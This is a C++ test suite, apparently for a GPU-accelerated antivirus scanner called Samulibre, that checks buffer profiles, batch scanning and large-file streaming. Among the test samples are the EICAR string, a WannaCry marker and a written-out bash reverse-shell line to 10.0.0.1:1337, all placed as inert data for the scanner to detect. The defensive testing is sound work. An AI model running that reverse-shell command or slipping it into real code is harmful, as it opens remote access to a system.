#include "compute_engine.hpp"
#include "signature_scanner.hpp"
#include "ml_classifier.hpp"
#include "batch_scheduler.hpp"
#include <iostream>
#include <cassert>
#include <vector>
#include <cstring>
#include <iomanip>

int main() {
    std::cout << "================================================================" << std::endl;
    std::cout << "  SAMULIBRE GPU ENGINE - TEST SUITE: BATCH SCHEDULER & PIPELINE " << std::endl;
    std::cout << "================================================================" << std::endl;

    samulibre::gpu::GPUComputeEngine engine(samulibre::gpu::ResourceProfile::BALANCED);
    bool init_ok = engine.initialize();
    assert(init_ok);

    std::cout << "[1] Motor de cómputo inicializado." << std::endl;
    std::cout << "    - Backend activo: " << engine.get_active_backend_name() << std::endl;
    std::cout << "    - GPU Acelerada: " << (engine.is_gpu_accelerated() ? "SÍ" : "NO") << std::endl;

    samulibre::gpu::SignatureScanner scanner(engine);
    samulibre::gpu::MLClassifier classifier(engine, &scanner);
    samulibre::gpu::BatchScheduler scheduler(engine, scanner, classifier);

    // =========================================================================
    // Test 1: Resource Profiles and Buffer Scaling
    // =========================================================================
    std::cout << "\n[2] Verificando Perfiles de Recursos y Buffers Pinned PCIe..." << std::endl;

    // Silent Mode
    scheduler.set_profile(samulibre::gpu::ResourceProfile::SILENT);
    std::cout << "    - Modo Silencioso: " << scheduler.get_slot_count() << " slot(s), " 
              << (scheduler.get_slot_capacity_bytes() / (1024 * 1024)) << " MB/slot" << std::endl;
    assert(scheduler.get_slot_count() == 1);
    assert(scheduler.get_slot_capacity_bytes() == 2 * 1024 * 1024);

    // Balanced Mode (Double Buffering)
    scheduler.set_profile(samulibre::gpu::ResourceProfile::BALANCED);
    std::cout << "    - Modo Equilibrado (Doble Buffer): " << scheduler.get_slot_count() << " slots, " 
              << (scheduler.get_slot_capacity_bytes() / (1024 * 1024)) << " MB/slot" << std::endl;
    assert(scheduler.get_slot_count() == 2);
    assert(scheduler.get_slot_capacity_bytes() == 8 * 1024 * 1024);

    // Performance Mode (Triple Buffering)
    scheduler.set_profile(samulibre::gpu::ResourceProfile::PERFORMANCE);
    std::cout << "    - Modo Rendimiento (Triple Buffer): " << scheduler.get_slot_count() << " slots, " 
              << (scheduler.get_slot_capacity_bytes() / (1024 * 1024)) << " MB/slot" << std::endl;
    assert(scheduler.get_slot_count() == 3);
    assert(scheduler.get_slot_capacity_bytes() == 16 * 1024 * 1024);
    std::cout << "    ✓ Ajuste de perfiles y topología de buffers circulares: PASADO 100%." << std::endl;

    // =========================================================================
    // Test 2: Batch Queueing & Parallel Pipeline Execution
    // =========================================================================
    std::cout << "\n[3] Ejecutando Lote Heterogéneo de Tareas en Pipeline Asíncrono..." << std::endl;

    // A. 5 tareas limpias
    for (int i = 0; i < 5; ++i) {
        std::vector<uint8_t> clean_buf(64 * 1024, 0x41 + (i % 26)); // 64 KB
        scheduler.enqueue_buffer(clean_buf.data(), clean_buf.size(), "clean_file_" + std::to_string(i) + ".dat");
    }

    // B. 3 tareas con firmas maliciosas conocidas
    std::string eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    std::vector<uint8_t> eicar_buf(32 * 1024, 0x90);
    std::memcpy(&eicar_buf[1000], eicar.data(), eicar.size());
    scheduler.enqueue_buffer(eicar_buf.data(), eicar_buf.size(), "sample_eicar.com");

    std::string wannacry = "WANACRY!";
    std::vector<uint8_t> wc_buf(48 * 1024, 0x90);
    std::memcpy(&wc_buf[500], wannacry.data(), wannacry.size());
    scheduler.enqueue_buffer(wc_buf.data(), wc_buf.size(), "ransomware_wannacry.bin");

    std::string revshell = "/bin/bash -i >& /dev/tcp/10.0.0.1/1337";
    std::vector<uint8_t> rev_buf(16 * 1024, 0x90);
    std::memcpy(&rev_buf[200], revshell.data(), revshell.size());
    scheduler.enqueue_buffer(rev_buf.data(), rev_buf.size(), "backdoor_revshell.sh");

    // C. 2 archivos del sistema real
    scheduler.enqueue_file("/bin/ls", samulibre::gpu::TaskPriority::NORMAL);
    scheduler.enqueue_file("/bin/sh", samulibre::gpu::TaskPriority::HIGH);

    assert(scheduler.pending_tasks_count() == 10);
    std::cout << "    - Tareas en cola: " << scheduler.pending_tasks_count() << std::endl;

    std::vector<samulibre::gpu::TaskScanReport> completed_reports;
    auto metrics = scheduler.process_all([&completed_reports](const samulibre::gpu::TaskScanReport& rep) {
        completed_reports.push_back(rep);
    });

    std::cout << "    - Total tareas procesadas: " << metrics.total_tasks << std::endl;
    std::cout << "    - Total bytes escaneados: " << (metrics.total_bytes_scanned / 1024) << " KB" << std::endl;
    std::cout << "    - Amenazas críticas detectadas: " << metrics.total_threats_found << std::endl;
    std::cout << "    - Tiempo total de reloj (wall time): " << metrics.total_wall_time_ms << " ms" << std::endl;
    std::cout << "    - Rendimiento medio: " << metrics.throughput_mb_s << " MB/s" << std::endl;
    std::cout << "    - Streams PCIe activos: " << metrics.active_streams << std::endl;
    std::cout << "    - Tiempo acumulado DMA PCIe: " << metrics.cumulative_dma_transfer_ms << " ms" << std::endl;
    std::cout << "    - Tiempo acumulado Cómputo GPU: " << metrics.cumulative_kernel_compute_ms << " ms" << std::endl;

    assert(metrics.total_tasks == 10);
    assert(metrics.total_threats_found >= 3);
    assert(completed_reports.size() == 10);
    std::cout << "    ✓ Pipeline asíncrono con triple buffering: PASADO 100%." << std::endl;

    // =========================================================================
    // Test 3: Large File Streaming Chunking (32 MB stream)
    // =========================================================================
    std::cout << "\n[4] Verificando Streaming y Procesamiento de Archivo Masivo (32 MB)..." << std::endl;

    size_t large_size = 32 * 1024 * 1024; // 32 MB
    std::vector<uint8_t> large_stream(large_size, 0x33);
    std::memcpy(&large_stream[16 * 1024 * 1024], wannacry.data(), wannacry.size());

    scheduler.enqueue_buffer(large_stream.data(), large_stream.size(), "massive_archive_32mb.iso");
    auto large_metrics = scheduler.process_all();

    std::cout << "    - Bytes procesados en streaming: " << (large_metrics.total_bytes_scanned / (1024 * 1024)) << " MB" << std::endl;
    std::cout << "    - Tiempo de procesamiento: " << large_metrics.total_wall_time_ms << " ms" << std::endl;
    std::cout << "    - Tasa de transferencia y escaneo: " << large_metrics.throughput_mb_s << " MB/s (" 
              << (large_metrics.throughput_mb_s / 1024.0) << " GB/s)" << std::endl;
    std::cout << "    - Amenaza detectada en bloque: " << large_metrics.total_threats_found << std::endl;

    assert(large_metrics.total_threats_found == 1);
    std::cout << "    ✓ Streaming de archivo grande sin saturación de memoria: PASADO 100%." << std::endl;

    std::cout << "\n================================================================" << std::endl;
    std::cout << "  TODAS LAS PRUEBAS DE LA FASE 6 COMPLETADAS CON ÉXITO (100% PASS)" << std::endl;
    std::cout << "================================================================" << std::endl;

    return 0;
}
